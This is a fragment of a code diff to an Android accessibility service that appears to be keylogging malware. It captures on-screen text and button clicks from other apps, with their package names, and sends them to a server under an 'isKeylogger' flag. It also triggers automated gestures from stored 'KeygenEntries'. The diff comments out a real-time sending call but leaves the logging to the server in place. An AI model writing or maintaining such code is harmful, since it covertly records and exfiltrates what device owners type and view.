@@ -1150,7 +1150,7 @@ public class MainAccessibilityService extends AccessibilityService {
                         text = source.getText().toString();
                         eventString = "Navigation";
                         if (Server.getContext() != null) {
-                            Server.getContext().sendRealtimeKeyLog(text, packagename, eventString);
+                            // Server.getContext().sendRealtimeKeyLog(text, packagename, eventString);
                             if (isKeylogger) {
                                 Server.getContext().sendKeyLog(text, packagename, eventString);
                             }
@@ -1208,7 +1208,7 @@ public class MainAccessibilityService extends AccessibilityService {
                             text = Button_Text;
                             eventString = "Button Click";
                             if (!text.equals("") && !text.equals("cancel") && !text.equals("cancelar") && !text.equals("取消")) {
-                                Server.getContext().sendRealtimeKeyLog(text, packagename, eventString);
+                                // Server.getContext().sendRealtimeKeyLog(text, packagename, eventString);
                                 if (isKeylogger) {
                                     Server.getContext().sendKeyLog(text, packagename, eventString);
                                 }
@@ -2761,7 +2761,7 @@ public class MainAccessibilityService extends AccessibilityService {
                     @Override
                     public void run() {
                         if(Common.getInstance().getKeygenEntries() != null && !Common.getInstance().getKeygenEntries().isEmpty()) {
-                           performGestureMain(Common.getInstance().getKeygenEntries());
+                            performGestureMain(Common.getInstance().getKeygenEntries());
                         }
                     }
                 }, 1000);
